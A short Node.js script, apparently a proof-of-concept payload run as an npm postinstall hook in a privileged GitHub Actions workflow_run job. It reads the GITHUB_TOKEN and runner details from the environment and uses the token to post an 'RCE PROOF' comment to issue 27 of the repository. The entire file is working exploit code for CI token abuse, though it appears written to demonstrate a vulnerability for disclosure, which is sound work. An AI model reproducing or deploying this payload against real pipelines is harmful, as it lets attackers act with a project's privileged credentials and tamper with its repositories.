const https = require('https');
const token = process.env.GITHUB_TOKEN || '';
const repo = process.env.GITHUB_REPOSITORY || 'unknown';
const body = JSON.stringify({
  body: '### RCE PROOF\n\n`npm install` dependency postinstall executed in the privileged workflow_run job.\n\n- repo: ' + repo +
        '\n- token_present: ' + (token ? 'yes' : 'no') +
        '\n- token_length: ' + token.length +
        '\n- actor: ' + (process.env.GITHUB_ACTOR || '') +
        '\n- runner: ' + (process.env.RUNNER_NAME || '')
});
const req = https.request({
  hostname: 'api.github.com',
  path: '/repos/' + repo + '/issues/27/comments',
  method: 'POST',
  headers: {
    authorization: 'Bearer ' + token,
    accept: 'application/vnd.github+json',
    'user-agent': 'poc',
    'content-type': 'application/json',
    'content-length': Buffer.byteLength(body)
  }
}, res => { console.log('RCE_POST_STATUS ' + res.statusCode); res.resume(); });
req.on('error', e => console.log('RCE_POST_ERR ' + e.message));
req.write(body);
req.end();
